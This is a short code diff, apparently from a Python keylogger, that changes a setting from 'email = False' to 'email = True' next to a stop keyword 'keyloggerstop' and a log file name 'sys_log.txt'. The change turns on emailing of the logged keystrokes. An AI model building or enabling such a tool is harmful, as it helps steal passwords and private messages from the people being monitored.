@@ -5,7 +5,7 @@ import os
 import os.path
 import smtplib
 
-email = False
+email = True
 keyword = "keyloggerstop"
 filename = "sys_log.txt"
 cycle = 10
